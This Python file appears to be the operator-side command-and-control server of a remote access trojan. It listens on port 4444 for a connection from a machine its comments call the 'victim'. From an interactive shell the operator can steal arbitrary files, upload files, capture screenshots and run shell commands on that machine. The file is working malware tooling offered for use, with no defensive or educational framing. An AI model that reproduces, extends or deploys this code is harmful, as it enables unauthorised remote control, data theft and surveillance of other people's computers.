# Import modules for networking, file management, and timing
import socket
import os
import time

# Server IP and Port configuration
SERVER_IP = "0.0.0.0"  # Bind to all interfaces
SERVER_PORT = 4444
BUFFER_SIZE = 1024

# Directory setup for file transfers
GRAB_DIR = "./grabbed/"      # Files received from victim
SEND_DIR = "./to_send/"      # Files to be sent to victim
os.makedirs(GRAB_DIR, exist_ok=True)
os.makedirs(SEND_DIR, exist_ok=True)

# ---------------------------------------------
# Receive a file from the victim machine
# ---------------------------------------------
def receive_file(sock, victim_path):
    try:
        clean_name = os.path.basename(victim_path.strip('"'))  # Normalize filename
        full_path = os.path.join(GRAB_DIR, clean_name)
        buffer = b""

        while True:
            data = sock.recv(BUFFER_SIZE)
            if not data:
                print("[!] Connection lost during file receive.")
                return

            print(f"[DEBUG] Received chunk: {data[:50]}")  # Preview data
            buffer += data

            if b"__END__" in buffer:
                parts = buffer.split(b"__END__", 1)
                content = parts[0]

                # Handle error flags or file-not-found from victim
                if b"[!]" in content or b"File not found" in content:
                    print(f"[!] Victim reported error: {content.decode(errors='ignore')}")
                else:
                    # Auto-convert from UTF-16 if needed
                    if content.startswith(b'\xff\xfe'):
                        print("[*] Detected UTF-16 BOM, converting to UTF-8")
                        content = content.decode('utf-16').encode('utf-8')

                    with open(full_path, 'wb') as f:
                        f.write(content)
                    print(f"[+] File received and saved to: {full_path}")
                return

    except Exception as e:
        print(f"[!] Error receiving file: {e}")

# ---------------------------------------------
# Send a file to the victim machine
# ---------------------------------------------
def send_file(sock, command_arg):
    try:
        filename = os.path.basename(command_arg.strip('"'))
        full_path = os.path.join(SEND_DIR, filename)

        if not os.path.isfile(full_path):
            print(f"[-] File not found: {full_path}")
            sock.send(b"File not found__END__")
            return

        if os.path.getsize(full_path) == 0:
            print(f"[-] File is empty: {full_path}")
            sock.send(b"File is empty__END__")
            return

        with open(full_path, 'rb') as f:
            while chunk := f.read(BUFFER_SIZE):
                sock.send(chunk)
            sock.send(b"__END__")  # End of file signal

        print(f"[+] File sent: {full_path}")

    except Exception as e:
        print(f"[!] Error sending file: {e}")
        try:
            sock.send(f"Error: {e}__END__".encode())
        except:
            pass

# ---------------------------------------------
# Main server logic: Command and control shell
# ---------------------------------------------
def main():
    # Setup listener socket
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((SERVER_IP, SERVER_PORT))
    server.listen(1)

    print(f"[*] Listening on {SERVER_IP}:{SERVER_PORT} ...")

    # Accept a client (victim) connection
    try:
        client, addr = server.accept()
        print(f"[+] Connection established from {addr}")
    except Exception as e:
        print(f"[!] Failed to accept connection: {e}")
        server.close()
        return

    # Interactive shell loop
    try:
        while True:
            command = input("Shell> ").strip()
            if not command:
                continue

            if command.lower() == "exit":
                client.send(b"exit")
                break

            # Send a file request to victim and receive it
            if command.startswith("send_file "):
                raw = command.split(" ", 1)[1].strip('"')
                client.send(command.encode())
                receive_file(client, raw)
                continue

            # Push a local file to victim
            elif command.startswith("receive_file "):
                raw = command.split(" ", 1)[1].strip('"')
                base = os.path.basename(raw)
                full_path = os.path.join(SEND_DIR, base)

                if not os.path.isfile(full_path):
                    print(f"[-] File not found: {full_path}")
                    client.send(b"File not found__END__")
                    continue

                client.send(command.encode())
                send_file(client, base)

                # Print result/acknowledgement from client
                try:
                    response = client.recv(BUFFER_SIZE)
                    if not response:
                        print("[!] Client disconnected.")
                        break
                    print(response.decode(errors="ignore"))
                except Exception as e:
                    print(f"[!] Error receiving response: {e}")
                    break
                continue

            # Request screenshot from victim
            elif command == "screencap":
                timestamp = time.strftime("%Y%m%d_%H%M%S")
                filename = f"screenshot_{timestamp}.jpg"
                client.send(command.encode())
                receive_file(client, filename)
                continue

            # Grab arbitrary file from victim
            elif command.startswith("grab*"):
                raw_path = command.split("*", 1)[1].strip('"')
                base_name = os.path.basename(raw_path)

                # Clear any pending data
                try:
                    client.settimeout(0.2)
                    while True:
                        leftover = client.recv(BUFFER_SIZE)
                        if not leftover:
                            break
                except:
                    pass
                finally:
                    client.settimeout(None)

                client.send(command.encode())

                # Receive file data with basic BOM detection
                try:
                    buffer = b""
                    while True:
                        data = client.recv(BUFFER_SIZE)
                        if not data:
                            print("[!] Connection lost during file receive.")
                            break
                        buffer += data
                        if b"__END__" in buffer:
                            content = buffer.split(b"__END__", 1)[0]
                            if b"[!]" in content or b"File not found" in content:
                                print(f"[!] Victim reported error: {content.decode(errors='ignore')}")
                            else:
                                if content.startswith(b'\xef\xbb\xbf'):
                                    print("[*] Detected UTF-8 BOM, stripping")
                                    content = content[3:]
                                file_path = os.path.join(GRAB_DIR, base_name)
                                with open(file_path, 'wb') as f:
                                    f.write(content)
                                print(f"[+] File received and saved to: {file_path}")
                            break
                except Exception as e:
                    print(f"[!] Error during grab: {e}")
                continue

            # Fallback: execute shell command remotely
            try:
                client.send(command.encode())
                response = client.recv(BUFFER_SIZE)
                if not response:
                    print("[!] Client disconnected.")
                    break
                print(response.decode(errors="ignore"))
            except Exception as e:
                print(f"[!] Lost connection: {e}")
                break

    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")

    # Clean shutdown
    finally:
        try:
            client.close()
        except:
            pass
        server.close()
        print("[*] Connection closed.")

# Entry point
if __name__ == "__main__":
    main()
